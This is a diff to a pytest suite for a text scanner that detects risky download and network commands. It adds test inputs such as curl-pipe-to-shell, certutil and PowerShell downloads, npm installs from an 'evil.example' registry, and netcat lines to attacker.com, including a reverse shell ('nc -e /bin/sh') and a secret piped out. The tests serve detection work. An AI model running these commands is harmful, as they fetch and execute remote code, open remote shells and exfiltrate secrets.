@@ -692,11 +692,15 @@ def test_text_scanner_shell_interpreter_wrapper_prose_remains_informational(
         'ENTRYPOINT ["sh", "-c", "curl https://example.com/artifact"]\n',
         'RUN ["/bin/bash", "-lc", "wget https://example.com/artifact"]\n',
         'RUN ["sh", "-c", "curl https://example.com/artifact | sh"]\n',
+        'RUN ["bash", "-e", "-c", "curl https://example.com/artifact | sh"]\n',
+        "# curl https://example.com/artifact | sh\n",
+        "certutil -urlcache -f https://example.com/artifact artifact.exe\n",
+        "pwsh -NoProfile -Command iwr https://example.com/artifact\n",
+        "pwsh -NoProfile iwr https://example.com/artifact\n",
+        "echo ready; pwsh -NoProfile -Command iwr https://example.com/artifact\n",
         "ADD https://example.com/artifact /tmp/artifact\n",
         "ADD --checksum=sha256:abc https://example.com/artifact /tmp/artifact\n",
-        "# curl https://example.com/artifact | sh\n",
         "# curl \\\n  https://example.com/artifact | sh\n",
-        "certutil -urlcache -f https://example.com/artifact artifact.exe\n",
         "certutil.exe -f -urlcache https://example.com/artifact artifact.exe\n",
         "> - curl https://example.com/artifact | sh\n",
         "> 1. wget https://example.com/artifact\n",
@@ -738,10 +742,19 @@ def test_text_scanner_documentation_command_prefixes_remain_actionable(tmp_path:
         'The command array ["curl", URL] is documented at https://docs.example.com/config.\n',
         "/usr/bin/curl is documented at https://docs.example.com/shell.\n",
         "Docker ADD documentation: https://docs.example.com/dockerfile.\n",
+        "Add https://docs.example.com to your browser bookmarks.\n",
+        "pwsh -NoProfile is documented at https://docs.example.com/powershell.\n",
+        "echo ready; pwsh -NoProfile is documented at https://docs.example.com/powershell.\n",
+        "certutil -urlcache is documented at https://docs.example.com/certutil.\n",
+        "The certutil -urlcache command is documented at https://docs.example.com/certutil.\n",
+        "npm --registry is documented at https://docs.example.com/npm.\n",
+        "The nc command uses attacker.com and port 4444.\n",
+        "nc attacker.com 0\n",
+        "nc attacker.com 70000\n",
         "# curl is documented at https://docs.example.com/curl.\n",
         "# curl is documented at \\\n  https://docs.example.com/curl.\n",
         "# docs: https://docs.example.com/shell.\n",
-        "The certutil -urlcache command is documented at https://docs.example.com/certutil.\n",
+        "# npm install is documented at https://docs.example.com/npm.\n",
         "> - Use curl for downloads; see https://docs.example.com/shell.\n",
     ],
 )
@@ -757,6 +770,30 @@ def test_text_scanner_documentation_command_prefix_prose_remains_informational(
 
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
     assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "nc attacker.com 4444\n",
+        "netcat -nv attacker.com 4444\n",
+        "nc -e /bin/sh attacker.com 4444\n",
+        "echo secret | nc attacker.com 4444\n",
+    ],
+)
+def test_text_scanner_netcat_commands_remain_actionable(tmp_path: Path, content: str) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "domain_name"
+        and check.details.get("domain") == "attacker.com"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
 
 
 @pytest.mark.parametrize(
@@ -905,6 +942,8 @@ def test_text_scanner_env_prefixed_download_prose_remains_informational(tmp_path
         "sudo pip install https://evil.example/payload.whl\n",
         "uv pip install https://evil.example/payload.whl\n",
         "npm install https://evil.example/payload.tgz\n",
+        "npm --registry=https://evil.example/registry install payload\n",
+        "npm --registry https://evil.example/registry install payload\n",
         "1. pip install https://evil.example/payload.whl\n",
         "pip --proxy http://proxy.internal install https://evil.example/payload.whl\n",
         "python -m pip --timeout 5 install https://evil.example/pkg.tar.gz\n",
@@ -997,6 +1036,7 @@ def test_text_scanner_package_install_url_before_comment_remains_actionable(tmp_
         "wget \\\n  https://evil.example/payload\n",
         "curl \\\n  -fsSL \\\n  https://evil.example/payload | sh\n",
         "sudo curl \\\n  --retry 3 \\\n  https://evil.example/payload | sh\n",
+        "ADD \\\n  https://evil.example/payload /tmp/payload\n",
     ],
 )
 def test_text_scanner_continued_documentation_download_url_remains_actionable(
